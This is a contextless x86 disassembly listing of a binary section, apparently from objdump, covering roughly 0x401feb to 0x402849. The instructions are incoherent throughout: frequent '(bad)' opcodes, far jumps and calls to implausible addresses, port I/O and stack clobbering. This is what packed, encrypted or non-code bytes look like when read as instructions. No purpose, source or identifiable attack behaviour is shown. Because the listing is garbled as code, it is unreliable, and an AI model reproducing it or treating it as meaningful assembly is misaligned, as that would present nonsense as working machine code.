  401feb:	add    edi,DWORD PTR [eax]
  401fed:	jne    0x401fd2
  401fef:	mov    DWORD PTR [eax-0x7449db04],ecx
  401ff5:	cmp    ecx,DWORD PTR [edi]
  401ff7:	sub    BYTE PTR [ebp-0x7e],dl
  401ffa:	sar    ebp,0xb
  401ffd:	jmp    FWORD PTR [edi+0x2400392a]
  402003:	sub    esi,DWORD PTR [ebx-0x73]
  402006:	mov    esp,DWORD PTR [ecx+edi*4]
  402009:	mov    ecx,DWORD PTR [eax]
  40200b:	and    BYTE PTR [eax],al
  40200d:	jne    0x401fd9
  40200f:	sub    ebp,ecx
  402011:	sbb    BYTE PTR [esi+0x32],ah
  402014:	dec    ebp
  402015:	push   ebp
  402016:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40201c:	ret    
  40201d:	mov    edx,ebp
  40201f:	leave  
  402020:	sub    DWORD PTR [esi+0x24],ebx
  402023:	ret    0x2b
  402026:	pop    ax
  402028:	push   ebp
  402029:	rol    BYTE PTR [ebx],0xeb
  40202c:	add    DWORD PTR [ecx+0x6c0001],0x40
  402033:	jb     0x40208a
  402035:	ret    
  402036:	in     al,dx
  402037:	jecxz  0x401fc4
  402039:	push   esi
  40203a:	xchg   esp,eax
  40203b:	jne    0x40203d
  40203d:	cmp    edx,DWORD PTR [esi+0x1c]
  402040:	jne    0x402026
  402042:	mov    eax,DWORD PTR [ebp-0x77]
  402045:	ror    DWORD PTR [ebx+0x899408],0xe0
  40204c:	mov    esi,DWORD PTR [ebp-0x75]
  40204f:	pop    esi
  402050:	nop
  402051:	mov    eax,DWORD PTR [eax]
  402053:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  402059:	add    al,0x0
  40205b:	inc    ebp
  40205c:	mov    eax,DWORD PTR [ebx]
  40205e:	mov    ebp,ebx
  402060:	cmp    al,0xf
  402062:	or     al,al
  402064:	inc    ebp
  402065:	inc    ebp
  402066:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  40206c:	cld    
  40206d:	add    BYTE PTR [edi+0x596c16c0],dh
  402073:	add    BYTE PTR [ecx-0x5],dl
  402076:	add    eax,0x17200
  40207b:	sbb    al,0x85
  40207d:	dec    esp
  40207e:	je     0x4020b8
  402080:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  402084:	add    BYTE PTR [ebx],bh
  402086:	(bad)  
  402087:	and    al,0x3b
  402089:	jae    0x402027
  40208b:	mov    cl,cl
  40208d:	inc    DWORD PTR [esp]
  402090:	push   ebp
  402091:	shr    esp,0x8
  402094:	in     al,dx
  402095:	push   esp
  402096:	and    DWORD PTR [eax],0xffffffdc
  402099:	retf   
  40209a:	(bad)  
  40209b:	mov    bh,0xe4
  40209d:	add    BYTE PTR [ebp+0x450ff8e9],dh
  4020a3:	retf   0x4cf8
  4020a6:	pushf  
  4020a7:	and    bh,al
  4020a9:	pop    ss
  4020aa:	rcr    cl,1
  4020ac:	test   DWORD PTR [eax],eax
  4020ae:	clc    
  4020af:	add    BYTE PTR [ebp+0x2b],al
  4020b2:	cmp    al,cl
  4020b4:	pushf  
  4020b5:	add    eax,0xd001c7
  4020ba:	add    eax,0x456cf8c0
  4020bf:	inc    eax
  4020c0:	push   ebx
  4020c1:	rcr    DWORD PTR [eax+0x4c0105],0x20
  4020c8:	inc    ebp
  4020c9:	fst    DWORD PTR [esi+0x29]
  4020cc:	mov    eax,DWORD PTR [eax]
  4020ce:	nop
  4020cf:	rol    BYTE PTR [eax],0xc0
  4020d2:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  4020d8:	add    DWORD PTR [ebx-0x75f9af00],ecx
  4020de:	pop    ebp
  4020df:	add    DWORD PTR [ecx+0x758bf800],ecx
  4020e5:	or     BYTE PTR [ebp-0xce8aca],al
  4020eb:	mov    bl,BYTE PTR [eax]
  4020ed:	add    DWORD PTR [ebp+0x0],edx
  4020f0:	call   0xfff31ffe
  4020f5:	add    DWORD PTR [edi],ecx
  4020f7:	add    BYTE PTR [edi],al
  4020f9:	push   cs
  4020fa:	inc    ecx
  4020fb:	or     BYTE PTR [ebx+0x18008901],0x8
  402102:	leave  
  402103:	dec    ecx
  402104:	dec    esi
  402105:	add    esi,DWORD PTR [ebp-0x39]
  402108:	call   0xffe61009
  40210d:	clc    
  40210e:	inc    ebp
  40210f:	inc    ebp
  402110:	mov    ecx,DWORD PTR [edi]
  402112:	enter  0x49,0x35
  402116:	mov    ecx,DWORD PTR [eax]
  402118:	xor    eax,0x79f0807
  40211d:	xor    bl,BYTE PTR [edi-0x743ecda2]
  402123:	or     al,0x1c
  402125:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40212c:	int3   
  40212d:	test   DWORD PTR [eax],eax
  40212f:	clc    
  402130:	inc    edx
  402132:	mov    eax,DWORD PTR [eax]
  402134:	fmul   DWORD PTR [ebx+0x74ff8300]
  40213a:	sub    BYTE PTR [ebp-0x40],ah
  40213d:	add    BYTE PTR [esi+0x45],bl
  402140:	leave  
  402141:	cmp    BYTE PTR [eax],bl
  402143:	pushf  
  402144:	mov    eax,edi
  402146:	jl     0x402128
  402148:	add    BYTE PTR [ebp+0x458df88b],al
  40214e:	add    al,0x3c
  402150:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  402157:	test   edx,esp
  402159:	clc    
  40215a:	or     eax,DWORD PTR [ebp+0x40]
  40215d:	cmp    BYTE PTR [ecx+0x458b949f],cl
  402163:	sbb    al,0xbe
  402165:	mov    ecx,DWORD PTR [eax]
  402167:	xchg   esp,eax
  402168:	pop    es
  402169:	add    dh,al
  40216b:	mov    esp,DWORD PTR [ebp+0x1c]
  40216e:	add    BYTE PTR [edi-0x61],dl
  402171:	mov    eax,0x30132
  402176:	mov    DWORD PTR [ebp-0x68],eax
  402179:	mov    eax,DWORD PTR [ebp-0x74]
  40217c:	xor    eax,DWORD PTR [eax]
  40217e:	add    ecx,DWORD PTR [ebx-0xf637677]
  402184:	inc    ebp
  402185:	jge    0x4021d7
  402187:	mov    DWORD PTR [ebp-0xc],eax
  40218a:	xor    eax,eax
  40218c:	add    ecx,DWORD PTR [ebx]
  40218e:	push   eax
  40218f:	jne    0x4021d6
  402191:	mov    eax,DWORD PTR ds:0x3f001c
  402197:	dec    DWORD PTR [ebx-0x7f74e375]
  40219d:	add    eax,DWORD PTR [ecx]
  40219f:	cmp    al,0x0
  4021a1:	push   cs
  4021a2:	inc    ebp
  4021a3:	inc    ebp
  4021a4:	add    al,0x85
  4021a6:	add    BYTE PTR [edi+edi*8-0x1],dh
  4021aa:	mov    ebx,DWORD PTR [esp+ecx*1]
  4021ad:	mov    ebp,0x8bffff4d
  4021b2:	mov    ebx,DWORD PTR [esp+esi*8]
  4021b5:	sbb    al,0x1
  4021b8:	inc    ebp
  4021b9:	add    BYTE PTR [ebx-0x74a67700],cl
  4021bf:	push   ecx
  4021c0:	clc    
  4021c1:	add    eax,0x457218
  4021c6:	mov    eax,DWORD PTR [ebp+0x50]
  4021c9:	jne    0x402210
  4021cb:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  4021d1:	add    edi,eax
  4021d3:	add    BYTE PTR [ebp+0x31],al
  4021d6:	lea    eax,[eax+0x4501dc]
  4021dc:	lea    edx,[eax-0x74]
  4021df:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  4021e5:	ret    0xc7
  4021e8:	mov    eax,DWORD PTR [eax+0xee011c]
  4021ee:	add    BYTE PTR [eax],cl
  4021f0:	push   eax
  4021f1:	inc    ebp
  4021f2:	inc    ebp
  4021f3:	add    DWORD PTR [ebx+0x8b98eb],ecx
  4021f9:	test   edi,eax
  4021fb:	jne    0x402189
  4021fd:	mov    eax,DWORD PTR [eax]
  4021ff:	mov    eax,DWORD PTR [eax]
  402201:	push   eax
  402202:	pop    ebp
  402203:	inc    ebp
  402204:	dec    DWORD PTR [ebx+0x590ce48b]
  40220a:	rcl    BYTE PTR [ecx-0x40],1
  40220d:	xor    esi,DWORD PTR [eax]
  40220f:	add    DWORD PTR [ebp-0x70],0xffffff83
  402213:	mov    edi,0x8372fc
  402218:	push   eax
  402219:	(bad)  
  40221a:	jbe    0x402261
  40221c:	mov    ecx,DWORD PTR [ebx-0x39341714]
  402222:	ret    
  402223:	(bad)  
  402224:	dec    ebp
  402225:	inc    ebp
  402226:	jmp    0x4021b5
  402228:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40222f:	(bad)  
  402230:	cld    
  402231:	(bad)  
  402232:	push   ebp
  402233:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  402239:	add    BYTE PTR [ebx],bh
  40223b:	push   eax
  40223c:	push   eax
  40223d:	inc    ebp
  40223e:	jmp    0x3d86dce
  402243:	add    BYTE PTR [ebx+0x8ca0c7],cl
  402249:	add    BYTE PTR [ebx-0x13cfd500],cl
  40224f:	inc    ebp
  402250:	ret    
  402251:	mov    DWORD PTR [ebp-0x14],edx
  402254:	mov    edx,eax
  402256:	sub    BYTE PTR [ebp-0x2d],cl
  402259:	mov    ecx,DWORD PTR [ebp-0x75]
  40225c:	mov    eax,esi
  40225e:	rol    BYTE PTR [eax],1
  402260:	inc    ebp
  402261:	add    DWORD PTR [eax],eax
  402263:	inc    ebp
  402264:	add    BYTE PTR [ecx+0x18838beb],cl
  40226a:	clc    
  40226b:	inc    eax
  40226c:	jmp    0x8d45:0x74945589
  402273:	xor    ecx,DWORD PTR [eax]
  402275:	add    edx,DWORD PTR [ebp-0x77]
  402278:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40227e:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  402285:	inc    ebp
  402286:	fdiv   DWORD PTR [ebx]
  402288:	loop   0x40228d
  40228a:	(bad)  
  40228c:	add    BYTE PTR [ebp+0x55],al
  40228f:	add    eax,0xd8008b
  402294:	jmp    0xcd80:0x611c818b
  40229b:	add    DWORD PTR [ebx],esi
  40229d:	add    BYTE PTR [ecx-0x63fbc2bb],al
  4022a3:	add    BYTE PTR [ebp-0x77],dh
  4022a6:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  4022ac:	dec    ebp
  4022ad:	inc    DWORD PTR [ebx]
  4022af:	test   DWORD PTR [ebx+0x108b0074],eax
  4022b5:	sbb    BYTE PTR [ebp+0x65],dl
  4022b8:	add    eax,DWORD PTR [eax]
  4022ba:	mov    edi,DWORD PTR [eax-0x75]
  4022bd:	add    ah,dl
  4022bf:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  4022c6:	dec    ebp
  4022c7:	mov    DWORD PTR [ebx-0xfc071c],eax
  4022cd:	dec    ebp
  4022ce:	call   0x5541d05d
  4022d3:	inc    ebp
  4022d4:	add    DWORD PTR [ebx+0x855fcf4],ecx
  4022da:	cmp    ecx,DWORD PTR [ebp-0x5c]
  4022dd:	inc    eax
  4022de:	add    BYTE PTR [ecx+0x73],dl
  4022e1:	jb     0x4022e6
  4022e3:	mov    esi,eax
  4022e5:	cmp    al,0x50
  4022e7:	retf   
  4022e8:	mov    DWORD PTR [ecx+0x4500f0],eax
  4022ee:	test   ebx,edx
  4022f0:	andnps xmm6,XMMWORD PTR [edx+0x3]
  4022f4:	dec    DWORD PTR [ecx+0x51ecfc8b]
  4022fa:	inc    ebp
  4022fb:	add    eax,edi
  4022fd:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  402304:	inc    ecx
  402305:	hlt    
  402306:	mov    DWORD PTR [eax],eax
  402308:	xchg   esp,eax
  402309:	add    BYTE PTR [ebp+0x7d],al
  40230c:	xor    eax,edx
  40230e:	add    edx,ecx
  402310:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  402316:	mov    DWORD PTR [eax-0x64],edx
  402319:	mov    DWORD PTR [ebp-0x8],eax
  40231c:	push   eax
  40231d:	push   ebp
  40231e:	inc    ebp
  40231f:	mov    DWORD PTR [ebx],esi
  402321:	call   0xf907829
  402326:	inc    ebp
  402327:	adc    al,BYTE PTR ds:0x810055
  40232d:	dec    DWORD PTR [ebx-0x7f76e400]
  402333:	aam    0x1
  402335:	push   ebp
  402336:	add    cl,al
  402338:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40233f:	call   FWORD PTR [esi+edx*8]
  402342:	cmp    dl,0x1
  402345:	test   DWORD PTR [eax],eax
  402347:	clc    
  402348:	inc    ebp
  402349:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40234f:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  402355:	cmp    edi,edi
  402357:	je     0x402329
  402359:	mov    eax,DWORD PTR [ebp-0x4]
  40235c:	add    edx,DWORD PTR [ecx]
  40235e:	sbb    al,0x0
  402360:	dec    ebp
  402361:	dec    ebp
  402362:	mov    DWORD PTR [ecx+0x4545011c],ecx
  402368:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40236e:	add    DWORD PTR [edx],eax
  402370:	add    BYTE PTR [ebp+0x45],cl
  402373:	jne    0x402300
  402375:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40237c:	cmp    esp,esi
  40237e:	jb     0x402311
  402380:	mov    eax,DWORD PTR [eax]
  402382:	mov    eax,DWORD PTR [eax]
  402384:	mov    edx,DWORD PTR [esp+edi*1]
  402387:	inc    ebp
  402388:	je     0x402315
  40238a:	push   eax
  40238b:	add    al,0x38
  40238d:	push   ebp
  40238e:	mov    DWORD PTR ds:[ecx],edi
  402391:	in     al,0xc
  402393:	shl    BYTE PTR [eax],cl
  402395:	test   DWORD PTR [ecx],eax
  402397:	call   DWORD PTR [edx]
  402399:	inc    esi
  40239b:	inc    ebp
  40239c:	ror    BYTE PTR [ecx+0x45459011],1
  4023a2:	jmp    0xff4120ab
  4023a7:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  4023ad:	mov    eax,DWORD PTR [eax]
  4023af:	loopne 0x40233c
  4023b1:	(bad)  
  4023b2:	sbb    al,0xc7
  4023b4:	inc    ebp
  4023b5:	inc    ebp
  4023b6:	push   ebx
  4023b7:	lea    edi,[eax+0x454fdc]
  4023bd:	lea    ecx,[ecx-0x74a774]
  4023c3:	or     BYTE PTR [edi-0x3a],dl
  4023c6:	js     0x40238f
  4023c8:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  4023ce:	inc    DWORD PTR [eax]
  4023d0:	call   DWORD PTR [eax+0x7a]
  4023d3:	inc    ebp
  4023d4:	add    BYTE PTR [ebx+0x859866],cl
  4023da:	(bad)  
  4023db:	(bad)  
  4023dc:	dec    DWORD PTR [ebx-0x2f99f3b9]
  4023e2:	test   DWORD PTR [ebp-0x1],eax
  4023e5:	mov    edi,edi
  4023e7:	add    al,0x0
  4023ea:	add    ax,WORD PTR [ebp-0xb20004]
  4023f1:	inc    DWORD PTR [edi+0x14]
  4023f4:	data16 or BYTE PTR [ebp-0xac008b],al
  4023fb:	push   ebp
  4023fc:	ror    BYTE PTR [ebx+0x4585fc66],0xff
  402403:	(bad)  
  402404:	inc    DWORD PTR [ebx+eax*2]
  402407:	inc    ebp
  402408:	add    BYTE PTR [ebx+0x45851c66],cl
  40240e:	dec    DWORD PTR [ebx+0xc090ff]
  402414:	mov    ax,WORD PTR [ebp-0x7f00e4]
  40241b:	add    DWORD PTR [esi+0x0],eax
  40241e:	add    BYTE PTR [eax],dh
  402420:	xor    WORD PTR [ebp-0xcd00e1],ax
  402427:	cmp    al,bh
  402429:	jbe    0x4023b4
  40242b:	lea    ebp,[edi+esi*1-0x1]
  40242f:	mov    edi,DWORD PTR [eax+0x394f03]
  402435:	jae    0x4023c0
  402437:	mov    ebp,DWORD PTR [esi-0x75]
  40243a:	dec    DWORD PTR [ebx+0x3d02bb8]
  402440:	add    BYTE PTR [ecx-0x38f7477],cl
  402446:	call   DWORD PTR [esi+0x55d7ffb8]
  40244c:	add    ah,ch
  40244e:	mov    esp,ebp
  402450:	jb     0x402452
  402452:	inc    DWORD PTR [eax]
  402454:	mov    eax,0x89e145
  402459:	sbb    al,0x89
  40245b:	push   esi
  40245c:	je     0x40246c
  40245e:	inc    DWORD PTR [eax]
  402460:	(bad)  
  402461:	data16 in al,dx
  402463:	test   DWORD PTR [ebp+0x7efff8ff],eax
  402469:	lea    eax,[eax]
  40246b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40246c:	mov    WORD PTR [ebp-0xa50077],0x45ff
  402475:	mov    eax,0x9c4f38
  40247a:	lea    ecx,[ecx-0x76a3f6]
  402480:	js     0x40240f
  402482:	inc    DWORD PTR [esi+eax*8]
  402485:	mov    esp,esp
  402487:	pop    esi
  402488:	(bad)  
  402489:	jmp    ebp
  40248b:	add    esi,0x50
  40248e:	out    0x89,al
  402490:	(bad)  
  402491:	pusha  
  402492:	out    0xff,eax
  402494:	(bad)  
  402495:	(bad)  
  402496:	call   0xc6c957a3
  40249b:	(bad)  
  40249c:	jmp    0xbec358a0
  4024a1:	inc    ebx
  4024a2:	add    BYTE PTR [ecx-0xbb9c00],cl
  4024a8:	in     al,0xb8
  4024aa:	mov    dh,0x4f
  4024ac:	add    DWORD PTR [eax],0x4a
  4024af:	mov    esi,ebx
  4024b1:	data16 mov bh,bh
  4024b4:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  4024bb:	push   0xb845ffe3
  4024c0:	in     eax,dx
  4024c1:	dec    edi
  4024c2:	inc    ebp
  4024c3:	add    bl,dl
  4024c5:	mov    DWORD PTR [ebp+0x6a],eax
  4024c8:	in     al,dx
  4024c9:	inc    DWORD PTR [ebp-0x75]
  4024cc:	sub    eax,0x2c854566
  4024d1:	inc    DWORD PTR [ebp-0x1]
  4024d4:	jle    0x402520
  4024d6:	leave  
  4024d7:	add    BYTE PTR [esi+eiz*2-0x24],al
  4024db:	test   DWORD PTR [esi+0x4aff83ff],esi
  4024e1:	push   0x668800de
  4024e6:	add    DWORD PTR [ebp-0x1300f9],0x45
  4024ed:	outs   dx,DWORD PTR ds:[esi]
  4024ee:	in     eax,dx
  4024ef:	add    BYTE PTR [ebp+0x66],al
  4024f2:	(bad)  
  4024f3:	test   DWORD PTR [ebp-0x1],eax
  4024f6:	jmp    0x4500:0xe17f45ff
  4024fd:	data16 fild WORD PTR [ebp-0x1100bb]
  402504:	inc    ebp
  402505:	inc    ebp
  402506:	xlat   BYTE PTR ds:[ebx]
  402507:	cmp    eax,DWORD PTR [ebp-0x64]
  40250a:	jle    0x4024c4
  40250c:	leave  
  40250d:	icebp  
  40250e:	inc    esp
  40250f:	add    ah,dl
  402511:	mov    DWORD PTR [esi+0x4aff8376],esi
  402517:	(bad)  
  402518:	fdivrp st(0),st
  40251a:	mov    BYTE PTR [ebp+0x4708f883],al
  402520:	in     al,dx
  402521:	test   WORD PTR [ebp-0x1],ax
  402528:	inc    ebp
  402529:	inc    ebp
  40252a:	mov    edx,ecx
  40252c:	cld    
  40252d:	inc    ebp
  40252e:	out    dx,al
  40252f:	rcl    BYTE PTR [ebx],cl
  402531:	inc    ebp
  402532:	mov    edi,edx
  402534:	mov    eax,DWORD PTR [ebp+0x54]
  402537:	sub    eax,0x2c3b45ff
  40253c:	jne    0x402510
  40253e:	mov    DWORD PTR [ebp-0x44],0xf8c9857e
  402545:	int3   
  402546:	inc    ebp
  402547:	add    ch,ch
  402549:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  402550:	xor    bl,0x1
  402553:	add    eax,DWORD PTR [eax]
  402555:	inc    ecx
  402556:	adc    BYTE PTR [eax],bl
  402558:	test   ecx,edi
  40255a:	add    dh,BYTE PTR [edx+0x0]
  40255d:	mov    BYTE PTR [ebp-0x24],0x8b
  402561:	(bad)  
  402562:	jl     0x402541
  402564:	add    dh,al
  402566:	mov    esi,ebx
  402568:	mov    eax,esi
  40256a:	sbb    al,0xdf
  40256c:	add    dh,0x1
  40256f:	loopne 0x402571
  402571:	(bad)  
  402572:	adc    cl,ah
  402574:	or     dh,al
  402576:	inc    ebp
  402577:	loop   0x402566
  402579:	xor    ebp,edx
  40257b:	(bad)  
  40257c:	(bad)  
  40257d:	or     eax,0x18ee0ff8
  402582:	jle    0x402577
  402584:	inc    ebp
  402585:	add    ebx,DWORD PTR [ecx+0x41]
  402588:	adc    BYTE PTR [eax],bl
  40258a:	repnz stc 
  40258c:	xor    BYTE PTR [edx+0x34],0xc6
  402590:	adc    ah,dl
  402592:	dec    ecx
  402593:	(bad)  
  402594:	repnz aad 0x45
  402597:	(bad)  
  402598:	mov    esi,edx
  40259a:	adc    al,0xc6
  40259c:	call   edi
  40259e:	(bad)  
  40259f:	(bad)  
  4025a0:	adc    al,bl
  4025a2:	inc    esi
  4025a4:	push   eax
  4025a5:	fld    DWORD PTR [ebp-0x3a]
  4025a8:	mov    esi,0x7c608da
  4025ad:	fcmovnb st,st(6)
  4025af:	xor    ebx,DWORD PTR [edi+0x30d328d]
  4025b5:	(bad)  
  4025b7:	sbb    BYTE PTR [ebp-0xd],al
  4025ba:	add    DWORD PTR [ebx],0x66
  4025bd:	inc    ecx
  4025be:	mov    ebx,DWORD PTR [eax]
  4025c0:	sbb    al,0xf9
  4025c2:	xor    BYTE PTR [edx+0x1],0x8d
  4025c6:	add    BYTE PTR [ebp+eax*4-0x1],dl
  4025ca:	dec    DWORD PTR [ecx+0x4d00fcff]
  4025d0:	add    BYTE PTR [eax+0x7145fc30],bh
  4025d6:	inc    DWORD PTR [ecx]
  4025d8:	mov    ecx,DWORD PTR [ebp-0x310010]
  4025de:	retf   
  4025df:	enter  0xe45,0x3b
  4025e3:	inc    ebp
  4025e4:	jne    0x40261e
  4025e6:	mov    eax,ds:0x33c70b9c
  4025eb:	mov    esp,0xf81585ee
  4025f0:	mov    ds:0x338b0b45,eax
  4025f5:	mov    WORD PTR [esi-0x5cc68e00],cs
  4025fb:	ud2    
  4025fd:	xchg   ebp,eax
  4025fe:	xor    eax,DWORD PTR [eax]
  402600:	dec    edx
  402601:	mov    eax,DWORD PTR [eax]
  402603:	sbb    al,0x83
  402605:	cmp    ah,0x1
  402608:	push   0x0
  40260a:	pop    eax
  40260b:	adc    BYTE PTR [ecx-0x7483bb],cl
  402611:	and    BYTE PTR [esi+0x0],0x85
  402615:	mov    edi,edi
  402617:	push   0xffffffff
  402619:	(bad)  
  40261a:	mov    esp,esi
  40261c:	adc    dh,0x75
  40261f:	loope  0x402687
  402621:	inc    ebp
  402622:	inc    ebp
  402623:	fild   QWORD PTR [edx-0x29]
  402626:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40262c:	inc    ebp
  40262d:	sub    BYTE PTR [edx+0x4a],0x58
  402631:	jmp    0x752c:0x40868889
  402638:	lea    ax,[ebp-0xc]
  40263c:	xor    eax,DWORD PTR [ebp-0x5f0078]
  402642:	mov    DWORD PTR [ebp-0x820076],eax
  402648:	stos   DWORD PTR es:[edi],eax
  402649:	mov    ebp,DWORD PTR [ebx-0x43a67414]
  40264f:	push   ecx
  402650:	test   DWORD PTR [ebx],esi
  402652:	(bad)  
  402653:	mov    ebx,0xc072ff
  402658:	push   ebp
  402659:	ret    
  40265a:	(bad)  
  40265b:	mov    eax,eax
  40265d:	sbb    al,0xdf
  40265f:	rcl    dh,0x50
  402662:	inc    ebp
  402663:	inc    ebp
  402664:	int3   
  402665:	mov    ebp,ebx
  402667:	cwde   
  402668:	mov    DWORD PTR [eax],0x10d3c7c8
  40266e:	jmp    0xd500:0xdf0145ff
  402675:	jmp    DWORD PTR [esi-0x75]
  402678:	inc    ebp
  402679:	or     BYTE PTR [edi],bh
  40267b:	rol    bh,1
  40267d:	dec    ebp
  40267e:	adc    BYTE PTR [ebx],dh
  402680:	inc    DWORD PTR [ebx]
  402682:	add    cl,BYTE PTR [ecx-0x3e174400]
  402688:	push   ss
  402689:	push   ds
  40268a:	add    cl,ah
  40268c:	test   DWORD PTR [ebx-0x1],esi
  40268f:	or     eax,0x22850bff
  402694:	jmp    ecx
  402696:	push   DWORD PTR [ebx-0x75]
  402699:	add    eax,0x3359e9ec
  40269e:	push   ecx
  40269f:	loope  0x4026d4
  4026a1:	jae    0x4026a6
  4026a3:	jmp    0x8527f8
  4026a8:	and    DWORD PTR [ebp+0x44],0x0
  4026ac:	mov    esp,DWORD PTR [eax]
  4026ae:	sbb    al,0x66
  4026b0:	add    BYTE PTR [ebp-0xff00ff],0x30
  4026b7:	mov    DWORD PTR [ebp+0x7e],eax
  4026ba:	(bad)  
  4026bb:	inc    DWORD PTR [ebx-0xbadf9a]
  4026c1:	push   0xffffffff
  4026c3:	pop    eax
  4026c4:	clc    
  4026c5:	mov    DWORD PTR [eax],ecx
  4026c7:	or     BYTE PTR [ecx-0x8aef8d],0x58
  4026ce:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  4026d4:	lea    esp,[esi+0x10]
  4026d7:	inc    ebp
  4026d8:	jmp    FWORD PTR [edx+0x50]
  4026db:	pop    eax
  4026dc:	inc    ebp
  4026dd:	mov    DWORD PTR [ebx],esi
  4026df:	mov    BYTE PTR [ebx],al
  4026e1:	rcl    BYTE PTR [eax+0x45],0x85
  4026e5:	inc    WORD PTR [ebp-0x1]
  4026e9:	lea    ecx,[ebx-0x7f99e35f]
  4026ef:	stos   BYTE PTR es:[edi],al
  4026f0:	add    DWORD PTR [ebp+0x0],eax
  4026f3:	mov    ecx,ecx
  4026f5:	adc    al,0x95
  4026f7:	(bad)  
  4026f8:	push   DWORD PTR [ebx]
  4026fa:	dec    DWORD PTR [ebp+0x45ffc095]
  402700:	dec    esi
  402702:	push   ebp
  402703:	loop   0x40268e
  402705:	(bad)  
  402706:	adc    al,0xc4
  402708:	call   ebx
  40270a:	mov    ecx,ebp
  40270c:	sbb    BYTE PTR [ebp-0x1],al
  40270f:	loopne 0x40269a
  402711:	cmp    al,0x24
  402713:	(bad)  
  402714:	dec    esp
  402716:	mov    eax,ebp
  402718:	sub    al,0xed
  40271a:	inc    edi
  40271c:	mov    eax,edx
  40271e:	xor    BYTE PTR [esi-0x1],bh
  402721:	test   edi,edi
  402723:	dec    DWORD PTR [ebx-0x2ffff701]
  402729:	add    BYTE PTR [ebp+0x2c],al
  40272c:	push   eax
  40272d:	add    bh,dl
  40272f:	mov    DWORD PTR [ebp+0x18],edi
  402732:	jbe    0x402733
  402734:	test   DWORD PTR [ebp-0xffefff],ecx
  40273a:	inc    ebp
  40273b:	push   eax
  40273c:	add    DWORD PTR [ebp-0x4],0x801be
  402743:	pop    es
  402744:	add    dh,0xfe
  402747:	ret    
  402748:	dec    DWORD PTR [ebx-0x3fffe34b]
  40274e:	mov    ecx,0x454f50
  402753:	mov    eax,ecx
  402755:	cwde   
  402756:	mov    DWORD PTR [eax],eax
  402758:	test   al,0xff
  40275a:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  402761:	lea    ecx,[ebp-0x7600f401]
  402767:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40276e:	push   ebp
  40276f:	dec    DWORD PTR [ebp-0x767ae601]
  402775:	push   DWORD PTR [eax+0x6685c2ff]
  40277b:	call   DWORD PTR [ebp-0x1]
  40277e:	lea    ecx,[ebx-0x397613e1]
  402784:	mov    ah,0xc3
  402786:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40278c:	mov    DWORD PTR [eax-0x48],edx
  40278f:	inc    ebp
  402790:	dec    edx
  402791:	mov    ecx,DWORD PTR [ebx+0x55006698]
  402797:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40279d:	dec    DWORD PTR [ebp-0x76e3b477]
  4027a3:	call   DWORD PTR [eax-0x6d5f7673]
  4027a9:	lea    eax,[ecx-0x1]
  4027ac:	inc    WORD PTR [ebp-0x73]
  4027b0:	cmp    edi,0x5
  4027b3:	dec    DWORD PTR [ecx+0x41ff9695]
  4027b9:	jmp    DWORD PTR [esi-0x73]
  4027bc:	inc    ebp
  4027bd:	jmp    DWORD PTR [esi-0x1]
  4027c0:	dec    ebp
  4027c1:	lea    esp,[esi-0x1]
  4027c4:	jge    0x4027c5
  4027c6:	mov    esi,DWORD PTR [eax]
  4027c8:	lock inc ebp
  4027ca:	mov    bh,0xff
  4027cc:	mov    WORD PTR [ebp-0x3c5f3a],cs
  4027d2:	rol    DWORD PTR [eax+0xf8ca289],0x45
  4027d9:	push   cs
  4027da:	str    WORD PTR [ebp-0x1]
  4027de:	xor    edi,esp
  4027e0:	add    edi,DWORD PTR [ebp+0x33]
  4027e3:	add    BYTE PTR [esi+0x0],ah
  4027e6:	inc    ebp
  4027e7:	rdpmc  
  4027e9:	mov    edi,0xbf45ff66
  4027ee:	dec    si
  4027f0:	inc    ebp
  4027f1:	add    BYTE PTR [ebx+0x45000c0d],cl
  4027f7:	mov    edi,edi
  4027f9:	data16 sbb al,0x45
  4027fc:	jne    0x402781
  4027fe:	push   ebx
  402800:	adc    al,0xd0
  402802:	jne    0x40278d
  402804:	jmp    FWORD PTR [edx+0x66755108]
  40280a:	call   0xffc42064
  40280f:	or     BYTE PTR [ebp-0x77],al
  402812:	mov    ebp,DWORD PTR [esi+0x6645511c]
  402818:	mov    edx,DWORD PTR [ebp-0x70]
  40281b:	add    DWORD PTR [eax],0x5
  40281e:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  402824:	add    DWORD PTR [esi+0x0],esp
  402827:	push   ebp
  402828:	xor    BYTE PTR [esi+0x4d],ah
  40282b:	dec    ebp
  40282c:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  402832:	mov    ecx,DWORD PTR [ebp-0x2ec3fe75]
  402838:	jl     0x4027c3
  40283a:	push   eax
  40283b:	mov    esi,?
  40283d:	rcl    bh,1
  40283f:	mov    DWORD PTR [esi],eax
  402841:	mov    es,esi
  402843:	push   ecx
  402844:	ret    0x166
  402847:	push   ebp
  402848:	pop    esi
  402849:	leavew 
